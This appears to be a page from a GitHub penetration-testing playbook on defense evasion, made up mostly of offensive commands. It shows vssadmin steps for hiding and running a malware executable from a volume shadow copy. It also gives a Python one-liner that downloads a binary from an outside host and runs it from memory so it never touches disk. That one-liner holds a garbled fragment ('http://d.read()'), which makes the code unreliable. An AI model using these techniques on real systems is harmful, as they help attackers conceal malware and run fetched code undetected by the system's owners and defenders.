# 4.1 Defense Evasion

## Table of Contents

- [Hide Malware by using Volume Shadow Copy](https://github.com/caesium55ds/PenTest_Playbook/blob/main/7-Actions-on-Objective/7.1-Post-Exploitation.md#Hide-Malware-using-Volume-Shadow-Copy)

## Hide Malware using Volume Shadow Copy

```c
C:\> vssadmin create shadow /for=c:
C:\> vssadmin list shadows
C:\> \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\<FILE>.exe
C:\> vssadmin delete shadows /shadow=<ID>
```

#### Running Binaries without touching Disk

```c
$ python3 -c 'import os; import urllib.request; d = urllib.request.urlopen("https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap?raw=true"); fd = os.memfd_create("foo"); os.write(fd, http://d.read()); p = f"/proc/self/fd/{fd}"; os.execve(p, [p, "-h"],{})'
```

### Previous

- [4 Exploitation](https://github.com/caesium55ds/PenTest_Playbook/blob/main/4-Exploitation/4-Exploitation.md)

### Next

- [4.2 Credential Dumping](https://github.com/caesium55ds/PenTest_Playbook/blob/main/4-Exploitation/4.2-Credential-Dumping.md)
- [4.3 Privilege Escalation](https://github.com/caesium55ds/PenTest_Playbook/blob/main/4-Exploitation/4.3-Privilege-Escalation.md)
- [4.4 Lateral Movement](https://github.com/caesium55ds/PenTest_Playbook/blob/main/4-Exploitation/4.4-Lateral-Movement.md)
